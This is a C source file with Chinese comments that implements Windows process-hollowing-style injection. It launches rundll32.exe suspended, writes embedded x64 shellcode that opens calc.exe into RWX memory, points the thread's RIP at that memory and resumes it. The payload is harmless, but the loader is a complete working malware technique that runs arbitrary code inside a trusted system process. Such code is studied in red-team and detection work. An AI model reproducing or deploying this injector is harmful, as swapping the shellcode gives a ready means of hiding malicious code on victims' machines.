#include <windows.h>
#include <stdio.h>

int main() {
    // Shellcode：启动calc.exe
    unsigned char shellcode_calc[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
        "\x63\x2e\x65\x78\x65\x00";

    // 计算Shellcode大小
    SIZE_T shellcodeSize = sizeof(shellcode_calc);

    // 可修改的命令行缓冲区
    WCHAR CommandLine[] = L"c:\\windows\\system32\\rundll32.exe";

    CONTEXT Context = { 0 };
    STARTUPINFOW StartupInfo = { 0 };
    PROCESS_INFORMATION ProcessInformation = { 0 };
    LPVOID lpBaseAddress = NULL;

    // 初始化StartupInfo
    StartupInfo.cb = sizeof(StartupInfo);

    // 创建进程（挂起状态）
    if (!CreateProcessW(NULL, CommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &StartupInfo, &ProcessInformation)) {
        printf("CreateProcessW failed: %d\n", GetLastError());
        return 1;
    }

    // 获取线程上下文
    Context.ContextFlags = CONTEXT_FULL; // 0x100007
    if (!GetThreadContext(ProcessInformation.hThread, &Context)) {
        printf("GetThreadContext failed: %d\n", GetLastError());
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
        return 1;
    }

    // 在目标进程中分配内存
    lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpBaseAddress) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
        return 1;
    }

    // 写入Shellcode
    if (!WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, shellcode_calc, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(ProcessInformation.hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
        return 1;
    }

    // 设置线程上下文，修改RIP指向Shellcode
    Context.Rip = (DWORD64)lpBaseAddress;
    if (!SetThreadContext(ProcessInformation.hThread, &Context)) {
        printf("SetThreadContext failed: %d\n", GetLastError());
        VirtualFreeEx(ProcessInformation.hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
        return 1;
    }

    // 恢复线程执行
    if (ResumeThread(ProcessInformation.hThread) == -1) {
        printf("ResumeThread failed: %d\n", GetLastError());
        VirtualFreeEx(ProcessInformation.hProcess, lpBaseAddress, 0, MEM_RELEASE);
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
        return 1;
    }

    // 清理句柄
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);

    printf("Shellcode injected and executed successfully!\n");
    return 0;
}